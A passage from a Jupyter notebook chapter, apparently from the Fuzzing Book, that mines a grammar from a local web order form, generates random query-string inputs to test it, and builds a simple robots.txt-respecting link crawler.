   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "The `<query>` is composed from the individual field items:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.642911Z",
     "iopub.status.busy": "2021-12-13T14:45:35.642345Z",
     "iopub.status.idle": "2021-12-13T14:45:35.644635Z",
     "shell.execute_reply": "2021-12-13T14:45:35.645064Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']"
      ]
     },
     "execution_count": 113,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<query>\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Each of these fields has the form `<field-name>=<field-type>`, where `<field-type>` is already defined in the grammar:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 114,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.648682Z",
     "iopub.status.busy": "2021-12-13T14:45:35.648076Z",
     "iopub.status.idle": "2021-12-13T14:45:35.650403Z",
     "shell.execute_reply": "2021-12-13T14:45:35.650841Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['zip=<number>']"
      ]
     },
     "execution_count": 114,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<zip>\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 115,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.654331Z",
     "iopub.status.busy": "2021-12-13T14:45:35.653748Z",
     "iopub.status.idle": "2021-12-13T14:45:35.656111Z",
     "shell.execute_reply": "2021-12-13T14:45:35.656528Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['terms=<checkbox>']"
      ]
     },
     "execution_count": 115,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<terms>\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "These are the query URLs produced from the grammar.  We see that these are similar to the ones produced from our hand-crafted grammar, except that the string values for names, email addresses, and cities are now completely random:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.681384Z",
     "iopub.status.busy": "2021-12-13T14:45:35.680660Z",
     "iopub.status.idle": "2021-12-13T14:45:35.683448Z",
     "shell.execute_reply": "2021-12-13T14:45:35.683825Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/order?item=drill&name=++%61&email=%6e%40b++&city=0&zip=88&terms=on&submit=',\n",
       " '/order?item=tshirt&name=%3f&email=21+%40+&city=++&zip=4&terms=off&submit=',\n",
       " '/order?item=drill&name=2&email=%62%40++%4d1++_%77&city=e%5d&zip=1&terms=on&submit=']"
      ]
     },
     "execution_count": 116,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "order_fuzzer = GrammarFuzzer(grammar)\n",
    "[order_fuzzer.fuzz() for i in range(3)]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can again feed these directly into our Web browser:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.695916Z",
     "iopub.status.busy": "2021-12-13T14:45:35.695354Z",
     "iopub.status.idle": "2021-12-13T14:45:35.706367Z",
     "shell.execute_reply": "2021-12-13T14:45:35.706009Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:35] INSERT INTO orders VALUES ('drill', ' ', '5F @p   a ', 'cdb', '3230')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:35] \"GET /order?item=drill&name=+&email=5F+%40p+++a+&city=cdb&zip=3230&terms=on&submit= HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook Rotary Hammer</strong> to   in cdb, 3230<br>\n",
       "  A confirmation mail will be sent to 5F @p   a .\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 117,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(webbrowser(urljoin(httpd_url, order_fuzzer.fuzz())))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We see (one more time) that we can mine a grammar automatically from given data."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### A Fuzzer for Web Forms\n",
    "\n",
    "To make things most convenient, let us define a `WebFormFuzzer` class that does everything in one place.  Given a URL, it extracts its HTML content, mines the grammar and then produces inputs for it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.711423Z",
     "iopub.status.busy": "2021-12-13T14:45:35.710778Z",
     "iopub.status.idle": "2021-12-13T14:45:35.712566Z",
     "shell.execute_reply": "2021-12-13T14:45:35.712934Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class WebFormFuzzer(GrammarFuzzer):\n",
    "    def __init__(self, url, **grammar_fuzzer_options):\n",
    "        html_text = self.get_html(url)\n",
    "        grammar = self.get_grammar(html_text)\n",
    "        super().__init__(grammar, **grammar_fuzzer_options)\n",
    "\n",
    "    def get_html(self, url):\n",
    "        return requests.get(url).text\n",
    "\n",
    "    def get_grammar(self, html_text):\n",
    "        grammar_miner = HTMLGrammarMiner(html_text)\n",
    "        return grammar_miner.mine_grammar()        "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "All it now takes to fuzz a Web form is to provide its URL:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.716576Z",
     "iopub.status.busy": "2021-12-13T14:45:35.716004Z",
     "iopub.status.idle": "2021-12-13T14:45:35.728490Z",
     "shell.execute_reply": "2021-12-13T14:45:35.729030Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=lockset&name=%6b+&email=+%40b5&city=%7e+5&zip=65&terms=on&submit='"
      ]
     },
     "execution_count": 119,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_fuzzer = WebFormFuzzer(httpd_url)\n",
    "web_form_fuzzer.fuzz()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can combine the fuzzer with a `WebRunner` as defined above to run the resulting fuzz inputs directly on our Web server:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.737357Z",
     "iopub.status.busy": "2021-12-13T14:45:35.736746Z",
     "iopub.status.idle": "2021-12-13T14:45:35.828448Z",
     "shell.execute_reply": "2021-12-13T14:45:35.828857Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[('http://127.0.0.1:8800/order?item=drill&name=+%6d&email=%40%400&city=%64&zip=9&terms=on&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=lockset&name=++&email=%63%40d&city=_&zip=6&terms=on&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=lockset&name=+&email=d%40_-&city=2++0&zip=1040&terms=off&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=tshirt&name=%4bb&email=%6d%40+&city=%7a%79+&zip=13&terms=off&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=lockset&name=d&email=%55+%40%74&city=+&zip=4&terms=on&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=tshirt&name=_+2&email=1++%40+&city=+&zip=30&terms=on&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=tshirt&name=+&email=a-%40+&city=+%57&zip=2&terms=on&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=lockset&name=%56&email=++%40a%55ee%44&city=+&zip=01&terms=off&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=tshirt&name=%6fc&email=++%40+&city=a&zip=25&terms=off&submit=',\n",
       "  'PASS'),\n",
       " ('http://127.0.0.1:8800/order?item=drill&name=55&email=3%3e%40%405&city=%4c&zip=0&terms=off&submit=',\n",
       "  'PASS')]"
      ]
     },
     "execution_count": 120,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_form_runner = WebRunner(httpd_url)\n",
    "web_form_fuzzer.runs(web_form_runner, 10)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "While convenient to use, this fuzzer is still very rudimentary:\n",
    "\n",
    "* It is limited to one form per page.\n",
    "* It only supports `GET` actions (i.e., inputs encoded into the URL).  A full Web form fuzzer would have to at least support `POST` actions.\n",
    "* The fuzzer is build on HTML only.  There is no Javascript handling for dynamic Web pages."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us clear any pending messages before we get to the next section:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.832344Z",
     "iopub.status.busy": "2021-12-13T14:45:35.831782Z",
     "iopub.status.idle": "2021-12-13T14:45:35.834460Z",
     "shell.execute_reply": "2021-12-13T14:45:35.834911Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "clear_httpd_messages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Crawling User Interfaces\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "So far, we have assumed there would be only one form to explore.  A real Web server, of course, has several pages – and possibly several forms, too.  We define a simple *crawler* that explores all the links that originate from one page."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Our crawler is pretty straightforward.  Its main component is again a `HTMLParser` that analyzes the HTML code for links of the form\n",
    "\n",
    "```html\n",
    "<a href=\"<link>\">\n",
    "```\n",
    "\n",
    "and saves all the links found in a list called `links`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.839775Z",
     "iopub.status.busy": "2021-12-13T14:45:35.839171Z",
     "iopub.status.idle": "2021-12-13T14:45:35.840781Z",
     "shell.execute_reply": "2021-12-13T14:45:35.841235Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class LinkHTMLParser(HTMLParser):\n",
    "    def reset(self):\n",
    "        super().reset()\n",
    "        self.links = []\n",
    "\n",
    "    def handle_starttag(self, tag, attrs):\n",
    "        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}\n",
    "\n",
    "        if tag == \"a\" and \"href\" in attributes:\n",
    "            # print(\"Found:\", tag, attributes)\n",
    "            self.links.append(attributes[\"href\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The actual crawler comes as a _generator function_ `crawl()` which produces one URL after another.  By default, it returns only URLs that reside on the same host; the parameter `max_pages` controls how many pages (default: 1) should be scanned.  We also respect the `robots.txt` file on the remote site to check which pages we are allowed to scan."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.844496Z",
     "iopub.status.busy": "2021-12-13T14:45:35.843910Z",
     "iopub.status.idle": "2021-12-13T14:45:35.846374Z",
     "shell.execute_reply": "2021-12-13T14:45:35.846858Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from collections import deque\n",
    "import urllib.robotparser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.854557Z",
     "iopub.status.busy": "2021-12-13T14:45:35.853980Z",
     "iopub.status.idle": "2021-12-13T14:45:35.855561Z",
     "shell.execute_reply": "2021-12-13T14:45:35.856007Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "def crawl(url, max_pages=1, same_host=True):\n",
    "    \"\"\"Return the list of linked URLs from the given URL.  Accesses up to `max_pages`.\"\"\"\n",
    "\n",
    "    pages = deque([(url, \"<param>\")])\n",
    "    urls_seen = set()\n",
    "\n",
    "    rp = urllib.robotparser.RobotFileParser()\n",
    "    rp.set_url(urljoin(url, \"/robots.txt\"))\n",
    "    rp.read()\n",
    "\n",
    "    while len(pages) > 0 and max_pages > 0:\n",
    "        page, referrer = pages.popleft()\n",
    "        if not rp.can_fetch(\"*\", page):\n",
    "            # Disallowed by robots.txt\n",
    "            continue\n",
    "\n",
    "        r = requests.get(page)\n",
    "        max_pages -= 1\n",
    "\n",
    "        if r.status_code != HTTPStatus.OK:\n",
    "            print(\"Error \" + repr(r.status_code) + \": \" + page,\n",
    "                  \"(referenced from \" + referrer + \")\",\n",
    "                  file=sys.stderr)\n",
    "            continue\n",
    "\n",
    "        content_type = r.headers[\"content-type\"]\n",
    "        if not content_type.startswith(\"text/html\"):\n",
    "            continue\n",
    "\n",
    "        parser = LinkHTMLParser()\n",
    "        parser.feed(r.text)\n",
    "\n",
    "        for link in parser.links:\n",
    "            target_url = urljoin(page, link)\n",
    "            if same_host and urlsplit(\n",
    "                    target_url).hostname != urlsplit(url).hostname:\n",
    "                # Different host\n",
    "                continue\n",
    "            if urlsplit(target_url).fragment != \"\":\n",
    "                # Ignore #fragments\n",
    "                continue\n",
    "\n",
    "            if target_url not in urls_seen:\n",
    "                pages.append((target_url, page))\n",
    "                urls_seen.add(target_url)\n",
    "                yield target_url\n",
    "\n",
    "        if page not in urls_seen:\n",
    "            urls_seen.add(page)\n",
    "            yield page"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "We can run the crawler on our own server, where it will quickly return the order page and the terms and conditions page."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.861036Z",
     "iopub.status.busy": "2021-12-13T14:45:35.860440Z",
     "iopub.status.idle": "2021-12-13T14:45:35.871803Z",
     "shell.execute_reply": "2021-12-13T14:45:35.872222Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:35] \"GET /robots.txt HTTP/1.1\" 404 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:35] \"GET / HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"http://127.0.0.1:8800/terms\">http://127.0.0.1:8800/terms</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"http://127.0.0.1:8800\">http://127.0.0.1:8800</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "for url in crawl(httpd_url):\n",
    "    print_httpd_messages()\n",
    "    print_url(url)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can also crawl over other sites, such as the home page of this project."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.875664Z",
     "iopub.status.busy": "2021-12-13T14:45:35.875103Z",
     "iopub.status.idle": "2021-12-13T14:45:36.483201Z",
     "shell.execute_reply": "2021-12-13T14:45:36.474636Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/\">https://www.fuzzingbook.org/</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/00_Table_of_Contents.html\">https://www.fuzzingbook.org/html/00_Table_of_Contents.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/01_Intro.html\">https://www.fuzzingbook.org/html/01_Intro.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Tours.html\">https://www.fuzzingbook.org/html/Tours.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Intro_Testing.html\">https://www.fuzzingbook.org/html/Intro_Testing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/02_Lexical_Fuzzing.html\">https://www.fuzzingbook.org/html/02_Lexical_Fuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Fuzzer.html\">https://www.fuzzingbook.org/html/Fuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Coverage.html\">https://www.fuzzingbook.org/html/Coverage.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/MutationFuzzer.html\">https://www.fuzzingbook.org/html/MutationFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GreyboxFuzzer.html\">https://www.fuzzingbook.org/html/GreyboxFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/SearchBasedFuzzer.html\">https://www.fuzzingbook.org/html/SearchBasedFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/MutationAnalysis.html\">https://www.fuzzingbook.org/html/MutationAnalysis.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/03_Syntactical_Fuzzing.html\">https://www.fuzzingbook.org/html/03_Syntactical_Fuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Grammars.html\">https://www.fuzzingbook.org/html/Grammars.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GrammarFuzzer.html\">https://www.fuzzingbook.org/html/GrammarFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GrammarCoverageFuzzer.html\">https://www.fuzzingbook.org/html/GrammarCoverageFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Parser.html\">https://www.fuzzingbook.org/html/Parser.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ProbabilisticGrammarFuzzer.html\">https://www.fuzzingbook.org/html/ProbabilisticGrammarFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GeneratorGrammarFuzzer.html\">https://www.fuzzingbook.org/html/GeneratorGrammarFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GreyboxGrammarFuzzer.html\">https://www.fuzzingbook.org/html/GreyboxGrammarFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Reducer.html\">https://www.fuzzingbook.org/html/Reducer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/04_Semantical_Fuzzing.html\">https://www.fuzzingbook.org/html/04_Semantical_Fuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GrammarMiner.html\">https://www.fuzzingbook.org/html/GrammarMiner.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/InformationFlow.html\">https://www.fuzzingbook.org/html/InformationFlow.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ConcolicFuzzer.html\">https://www.fuzzingbook.org/html/ConcolicFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/SymbolicFuzzer.html\">https://www.fuzzingbook.org/html/SymbolicFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/DynamicInvariants.html\">https://www.fuzzingbook.org/html/DynamicInvariants.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/05_Domain-Specific_Fuzzing.html\">https://www.fuzzingbook.org/html/05_Domain-Specific_Fuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ConfigurationFuzzer.html\">https://www.fuzzingbook.org/html/ConfigurationFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/APIFuzzer.html\">https://www.fuzzingbook.org/html/APIFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Carver.html\">https://www.fuzzingbook.org/html/Carver.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/WebFuzzer.html\">https://www.fuzzingbook.org/html/WebFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/GUIFuzzer.html\">https://www.fuzzingbook.org/html/GUIFuzzer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/06_Managing_Fuzzing.html\">https://www.fuzzingbook.org/html/06_Managing_Fuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/FuzzingInTheLarge.html\">https://www.fuzzingbook.org/html/FuzzingInTheLarge.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/WhenToStopFuzzing.html\">https://www.fuzzingbook.org/html/WhenToStopFuzzing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/99_Appendices.html\">https://www.fuzzingbook.org/html/99_Appendices.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
